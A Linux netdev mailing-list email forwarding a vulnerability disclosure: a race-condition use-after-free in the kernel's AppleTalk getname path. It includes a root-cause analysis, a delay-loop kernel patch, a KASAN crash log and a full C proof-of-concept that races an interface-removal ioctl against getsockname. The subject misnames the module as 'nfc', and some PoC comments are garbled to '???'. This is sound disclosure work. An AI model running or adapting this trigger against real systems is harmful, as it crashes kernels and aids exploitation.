Return-Path: <netdev+bounces-38746-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
	by mail.lfdr.de (Postfix) with ESMTPS id DDA4F7BC519
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:41:11 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 7EB452820EA
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:41:10 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id A787079D2;
	Sat,  7 Oct 2023 06:41:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dkim=none
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A21236FCB
	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:41:06 +0000 (UTC)
Received: from 1wt.eu (ded1.1wt.eu [163.172.96.212])
	by lindbergh.monkeyblade.net (Postfix) with ESMTP id 548AABF
	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:41:02 -0700 (PDT)
Received: (from willy@localhost)
	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976en0J021194;
	Sat, 7 Oct 2023 08:40:49 +0200
Date: Sat, 7 Oct 2023 08:40:49 +0200
From: Willy Tarreau <w@1wt.eu>
To: netdev@vger.kernel.org
Cc: rootlab@huawei.com
Subject: Fwd: Race Condition Vulnerability in atalk_getname of nfc module
 leading to UAF
Message-ID: <20231007064048.GX20998@1wt.eu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,
	RCVD_IN_DNSWL_BLOCKED,SPF_HELO_PASS,SPF_PASS autolearn=ham
	autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

Hello,

Sili Luo of Huawei sent this to the security list. Eric and I think it
does not deserve special handling from the security team and will be
better addressed here.

Regards,
Willy

PS: actually there were 8, not 6 reports for atalk in this series.

----- Forwarded message from rootlab <rootlab@huawei.com> -----

> Date: Sat, 7 Oct 2023 03:11:48 +0000
> From: rootlab <rootlab@huawei.com>
> Subject: Race Condition Vulnerability in atalk_getname of nfc module leading to UAF
> To: "security@kernel.org" <security@kernel.org>
> Delivered-To: security@kernel.org
> 
> I recently found an race condition Vulnerability in the atalk_getname, which leads to the kernel access free'd stalk_addr object.
> 
> The vulnerability code presented below is located in Linux 6.5-rc5, and it is possible that other versions may also be affected.
> 
> [Root Cause]
> 
> key code of atalk_getname:
> 
>   *   atalk_getname
> 
>      *   atalk_autobind
> 
>         *   struct atalk_addr *ap = atalk_find_primary()
>         *   use ap
> 
> important notes:
> 
>   *   atalk_getname hold the lock of sk , then it call atalk_autobind.
>   *   atalk_autobind use atalk_find_primary to find the ap and use the ap.
> 
> atalk_find_primary will search for iface from the atalk_interfaces linked list and finally return &fiface->address
> 
> static struct atalk_addr *atalk_find_primary(void)
> {
>         struct atalk_iface *fiface = NULL;
>         struct atalk_addr *retval;
>         struct atalk_iface *iface;
> 
>         /*
>          * Return a point-to-point interface only if
>          * there is no non-ptp interface available.
>          */
>         read_lock_bh(&atalk_interfaces_lock);
>         for (iface = atalk_interfaces; iface; iface = iface->next) {
>                 if (!fiface && !(iface->dev->flags & IFF_LOOPBACK))
>                         fiface = iface;
>                 if (!(iface->dev->flags & (IFF_LOOPBACK | IFF_POINTOPOINT))) {
>                         retval = &iface->address;
>                         goto out;
>                 }
>         }
> 
>         if (fiface)
>                 retval = &fiface->address;
>         else if (atalk_interfaces)
>                 retval = &atalk_interfaces->address;
>         else
>                 retval = NULL;
> out:
>         read_unlock_bh(&atalk_interfaces_lock);
>         return retval;
> }
> 
> 
> iface can be free'd through ioctl(at_fd, SIOCDIFADDR, &atreq);.
> 
>   *   atalk_ioctl
> 
>      *   rtnl_lock();
> 
>      *   atalk_dev_down
> 
>         *   atif_drop_device
> 
>            *   kfree(tmp);
>      *   rtnl_unlock();
> 
> During the atalk_ioctl --> atif_drop_device process, only the rtnl lock is obtained. Inconsistency between the rtnl lock and the atalk_bind lock causes UAF.
> 
>                                                   Time
>                                                    +
>                                                    |
> thread A                                           |  thread B
> atalk_autobi                                       |  ioctl --> atalk_dev_down
>                                                    |
>                                                    |
>   1.struct atalk_addr *ap = atalk_find_primary()   |
>                                                    |
>                                                    |
>                                                    |     2.atif_drop_device(dev)  --> free ap
>                                                    |
>                                                    |
>     // UAF!                                        |
>   3.use ap                                         |
>                                                    +
> 
> 
> [Patch Suggestion]
> 
>   1.  add refcount for struct atalk_addr
>   2.  Use the right lock
> 
> [Proof-of-Concept]
> 
> The POC is at the end of the email.
> 
> Test Environment:qemu x86_64 + linux 6.5-rc5 + kasan
> 
> To increase the probability of race, I add some loops to the race part of the code ( atalk_autobind ) to increase the time window.
> 
> the dxxx() function just do some loop to increase the time window.
> 
> From 92be4dc3450dda7016bced0b5fcd59bfdc2f8c92 Mon Sep 17 00:00:00 2001
> From: luosili <rootlab@huawei.com>
> Date: Wed, 27 Sep 2023 18:19:34 +0800
> Subject: [PATCH] appletalk: patch for race in atalk_getname
> 
> add some loops in the race code.
> 
> Signed-off-by: luosili <rootlab@huawei.com>
> ---
>  net/appletalk/ddp.c | 14 ++++++++++++++
>  1 file changed, 14 insertions(+)
> 
> diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
> index 8978fb6212ff..2656a35df80b 100644
> --- a/net/appletalk/ddp.c
> +++ b/net/appletalk/ddp.c
> @@ -1114,6 +1114,19 @@ try_next_port:;
>         return retval;
>  }
> 
> +#pragma GCC push_options
> +#pragma GCC optimize ("O0")
> +noinline u64 dxxx(void)
> +{
> +       u64 xxx = 0;
> +       for (size_t i = 0; i < 100000000; i++) {
> +               xxx *= 0x241;
> +               xxx += 0x1234;
> +       }
> +       return xxx;
> +}
> +#pragma GCC pop_options
> +
>  static int atalk_autobind(struct sock *sk)
>  {
>         struct atalk_sock *at = at_sk(sk);
> @@ -1121,6 +1134,7 @@ static int atalk_autobind(struct sock *sk)
>         struct atalk_addr *ap = atalk_find_primary();
>         int n = -EADDRNOTAVAIL;
> 
> +       dxxx();
>         if (!ap || ap->s_net == htons(ATADDR_ANYNET))
>                 goto out;
> 
> --
> 2.25.1
> 
> 
> 
> panic log
> 
> # /tmp/atalk_getname
> fd: 3
> [   32.238260] ==================================================================
> [   32.240272] BUG: KASAN: slab-use-after-free in atalk_autobind+0x82/0x150 [appletalk]
> [   32.242194] Read of size 2 at addr ffff88800d2e0248 by task atalk_getname/164
> [   32.243805]
> [   32.244170] CPU: 1 PID: 164 Comm: atalk_getname Tainted: G           OE      6.5.0-rc5 #7
> [   32.246107] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
> [   32.248182] Call Trace:
> [   32.248801]  <TASK>
> [   32.249337]  dump_stack_lvl+0x4c/0x70
> [   32.250208]  print_report+0xd3/0x620
> [   32.251028]  ? kasan_complete_mode_report_info+0x7d/0x200
> [   32.252268]  ? atalk_autobind+0x82/0x150 [appletalk]
> [   32.253500]  kasan_report+0xc2/0x100
> [   32.254360]  ? atalk_autobind+0x82/0x150 [appletalk]
> [   32.255547]  __asan_load2+0x7d/0xb0
> [   32.256364]  atalk_autobind+0x82/0x150 [appletalk]
> [   32.257567]  ? __pfx_atalk_autobind+0x10/0x10 [appletalk]
> [   32.258843]  ? aa_sk_perm+0x183/0x3b0
> [   32.259723]  ? _raw_spin_unlock_bh+0x21/0x30
> [   32.260710]  atalk_getname+0xba/0x210 [appletalk]
> [   32.261933]  ? __pfx_atalk_getname+0x10/0x10 [appletalk]
> [   32.263283]  __sys_getsockname+0xeb/0x180
> [   32.264303]  ? __pfx___sys_getsockname+0x10/0x10
> [   32.265406]  ? __kasan_check_write+0x18/0x20
> [   32.266436]  ? switch_fpu_return+0x9f/0x150
> [   32.267497]  ? exit_to_user_mode_prepare+0x9b/0x190
> [   32.268729]  ? syscall_exit_to_user_mode+0x2a/0x50
> [   32.269854]  __x64_sys_getsockname+0x47/0x60
> [   32.270861]  do_syscall_64+0x60/0x90
> [   32.271692]  ? exit_to_user_mode_prepare+0x9b/0x190
> [   32.272846]  ? syscall_exit_to_user_mode+0x2a/0x50
> [   32.274062]  ? ret_from_fork+0x2d/0x70
> [   32.274999]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [   32.276215] RIP: 0033:0x4605cb
> [   32.276990] Code: 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa b8 33 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
> [   32.281398] RSP: 002b:00007fa018906d88 EFLAGS: 00000246 ORIG_RAX: 0000000000000033
> [   32.283236] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00000000004605cb
> [   32.285048] RDX: 0000000000000010 RSI: 00007fa018906d90 RDI: 0000000000000003
> [   32.286726] RBP: 00007fa018906db0 R08: 0000000000000000 R09: 00007fa018907700
> [   32.288387] R10: 00007fa0189079d0 R11: 0000000000000246 R12: 00007ffd916160ae
> [   32.290208] R13: 00007ffd916160af R14: 00007ffd916160b0 R15: 00007fa018906e80
> [   32.292133]  </TASK>
> [   32.292712]
> [   32.293089] Allocated by task 162:
> [   32.293893]  kasan_save_stack+0x2a/0x50
> [   32.294898]  kasan_set_track+0x29/0x40
> [   32.295817]  kasan_save_alloc_info+0x1f/0x30
> [   32.296875]  __kasan_kmalloc+0xb5/0xc0
> [   32.297863]  kmalloc_trace+0x4e/0xb0
> [   32.298812]  atif_ioctl+0x904/0xaf0 [appletalk]
> [   32.300002]  atalk_ioctl+0x124/0x210 [appletalk]
> [   32.301189]  sock_do_ioctl+0xb9/0x1a0
> [   32.302168]  sock_ioctl+0x1b1/0x420
> [   32.303092]  __x64_sys_ioctl+0xd1/0x110
> [   32.304116]  do_syscall_64+0x60/0x90
> [   32.305070]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [   32.306276]
> [   32.306643] Freed by task 163:
> [   32.307359]  kasan_save_stack+0x2a/0x50
> [   32.308335]  kasan_set_track+0x29/0x40
> [   32.309277]  kasan_save_free_info+0x2f/0x50
> [   32.310296]  __kasan_slab_free+0x12e/0x1c0
> [   32.311252]  __kmem_cache_free+0x1b9/0x380
> [   32.312214]  kfree+0x7a/0x120
> [   32.312960]  atif_drop_device+0xad/0x100 [appletalk]
> [   32.314281]  atif_ioctl+0x1f9/0xaf0 [appletalk]
> [   32.315484]  atalk_ioctl+0x124/0x210 [appletalk]
> [   32.316678]  sock_do_ioctl+0xb9/0x1a0
> [   32.317678]  sock_ioctl+0x1b1/0x420
> [   32.318606]  __x64_sys_ioctl+0xd1/0x110
> [   32.319617]  do_syscall_64+0x60/0x90
> [   32.320568]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [   32.321759]
> [   32.322177] The buggy address belongs to the object at ffff88800d2e0240
> [   32.322177]  which belongs to the cache kmalloc-32 of size 32
> [   32.325341] The buggy address is located 8 bytes inside of
> [   32.325341]  freed 32-byte region [ffff88800d2e0240, ffff88800d2e0260)
> [   32.328094]
> [   32.328513] The buggy address belongs to the physical page:
> [   32.329892] page:0000000097ead656 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xd2e0
> [   32.332226] flags: 0xfffffc0000200(slab|node=0|zone=1|lastcpupid=0x1fffff)
> [   32.334025] page_type: 0xffffffff()
> [   32.334944] raw: 000fffffc0000200 ffff888006842500 dead000000000122 0000000000000000
> [   32.336910] raw: 0000000000000000 0000000000400040 00000001ffffffff 0000000000000000
> [   32.338722] page dumped because: kasan: bad access detected
> [   32.340072]
> [   32.340429] Memory state around the buggy address:
> [   32.341596]  ffff88800d2e0100: 00 00 00 00 fc fc fc fc 00 00 00 02 fc fc fc fc
> [   32.343301]  ffff88800d2e0180: fa fb fb fb fc fc fc fc 00 00 03 fc fc fc fc fc
> [   32.345141] >ffff88800d2e0200: fa fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
> [   32.346985]                                               ^
> [   32.348437]  ffff88800d2e0280: 00 00 03 fc fc fc fc fc 00 00 00 fc fc fc fc fc
> [   32.350308]  ffff88800d2e0300: 00 00 03 fc fc fc fc fc 00 00 00 fc fc fc fc fc
> [   32.352381] ==================================================================
> [   32.374651] Disabling lock debugging due to kernel taint
> #
> 
> 
> [CREDIT]
> 
> Sili Luo
> RO0T Lab of Huawei
> 
> poc
> 
> #define _GNU_SOURCE
> #include <errno.h>
> #include <fcntl.h>
> #include <linux/if_tun.h>
> #include <linux/atalk.h>
> #include <net/if.h>
> #include <pthread.h>
> #include <sched.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/socket.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> #include <time.h>
> #include <unistd.h>
> 
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <arpa/inet.h>
> #include <linux/if_packet.h>
> #include <net/ethernet.h>
> #include <netinet/if_ether.h>
> #include <netinet/in.h>
> #include <netinet/ip.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <net/route.h>
> 
> 
> void pincpu(int cpu) {
>   cpu_set_t set;
>   CPU_ZERO(&set);
>   CPU_SET(cpu, &set);
>   if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
>     perror("setaffinity");
>   }
> }
> 
> int at_fd;
> 
> #define THREAD_NUMS 2
> pthread_barrier_t barrier;
> 
> 
> void del() {
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCDIFADDR, &atreq);
> }
> 
> void free_thread() {
>   pincpu(0);
> 
>   srand(time(NULL));
> 
> 
>   usleep(35000);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCDIFADDR, &atreq);
> }
> 
> void use_thread() {
>   pincpu(1);
>   struct sockaddr addr = {0};
>   getsockname(at_fd, &addr, sizeof(struct sockaddr));
> }
> 
> #define ETH_P_X25 0x0805
> 
> int send_pkt2() {
>   int sockfd;
>   struct sockaddr_ll sa;
>   struct ether_header eth_header;
>   struct iphdr ip_header;
>   char packet[ETH_FRAME_LEN];
>   char *interface = "lo"; // Replace with your desired interface name
> 
>   // Create socket
>   sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_PPPTALK));
>   if (sockfd == -1) {
>     perror("socket");
>     return 1;
>   }
> 
>   // Set interface index
>   memset(&sa, 0, sizeof(struct sockaddr_ll));
>   sa.sll_family = AF_PACKET;
>   sa.sll_protocol = htons(ETH_P_PPPTALK);
>   sa.sll_ifindex = if_nametoindex(interface);
> 
>   // Set Ethernet header
>   memset(&eth_header, 0, sizeof(struct ether_header));
>   eth_header.ether_shost[0] = 0x00; // Source MAC address
>   eth_header.ether_shost[1] = 0x11;
>   eth_header.ether_shost[2] = 0x22;
>   eth_header.ether_shost[3] = 0x33;
>   eth_header.ether_shost[4] = 0x44;
>   eth_header.ether_shost[5] = 0x55;
>   eth_header.ether_dhost[0] = 0x66; // Destination MAC address
>   eth_header.ether_dhost[1] = 0x77;
>   eth_header.ether_dhost[2] = 0x88;
>   eth_header.ether_dhost[3] = 0x99;
>   eth_header.ether_dhost[4] = 0xAA;
>   eth_header.ether_dhost[5] = 0xBB;
>   eth_header.ether_type = htons(ETH_P_X25);
> 
>   // Set IP header
>   memset(&ip_header, 0x22, sizeof(struct iphdr));
> 
>   memcpy(packet, &eth_header, sizeof(struct ether_header));
> 
>   uint8_t *ptr = packet + sizeof(struct ether_header);
> 
>   *(uint64_t *)ptr = 0x11223344;
> 
>   // Send the packet
>   if (sendto(sockfd, packet, sizeof(struct ether_header) + 4, 0,
>              (struct sockaddr *)&sa, sizeof(struct sockaddr_ll)) == -1) {
>     perror("sendto");
>     return 1;
>   }
> 
>   printf("Packet sent successfully.\n");
> 
>   // Close the socket
>   close(sockfd);
> 
>   return 0;
> }
> 
> #define ETH_P_X25 0x0805
> 
> int send_pkt() {
>   // ???????
>   int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_X25));
>   if (sockfd == -1) {
>     perror("Socket creation failed");
>     exit(EXIT_FAILURE);
>   }
> 
>   // ??socket????
>   struct sockaddr_ll sa;
>   memset(&sa, 0, sizeof(struct sockaddr_ll));
>   sa.sll_family = AF_PACKET;
>   sa.sll_protocol = htons(ETH_P_X25);
> 
>   // ??????
>   sa.sll_ifindex = if_nametoindex("eth0");
>   if (sa.sll_ifindex == 0) {
>     perror("Interface not found");
>     close(sockfd);
>     exit(EXIT_FAILURE);
>   }
> 
>   // ??X.25???
>   char packet[] = {0x00, 0x00, 0x00, 0x00, // X.25?
>                    // ??X.25?????
>                    0x11, 0x22, 0x33};
> 
>   // ?????
>   if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&sa,
>              sizeof(struct sockaddr_ll)) == -1) {
>     perror("Packet sending failed");
>     close(sockfd);
>     exit(EXIT_FAILURE);
>   }
> 
>   printf("Packet sent successfully\n");
> 
>   // ?????
>   close(sockfd);
> 
>   return 0;
> }
> 
> int main() {
> 
> 
>   at_fd = socket(PF_APPLETALK, SOCK_DGRAM, 0);
>   printf("fd: %d\n", at_fd);
> 
>   del();
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCSIFADDR, &atreq);
> 
> 
> 
> 
>   pthread_barrier_init(&barrier, NULL, THREAD_NUMS);
> 
>   pthread_t ids[2] = {0};
>   pthread_create(&ids[0], NULL, (void *)free_thread, NULL);
>   pthread_create(&ids[1], NULL, (void *)use_thread, NULL);
> 
>   pthread_join(ids[0], NULL);
>   pthread_join(ids[1], NULL);
> }
> 
> 

----- End forwarded message -----

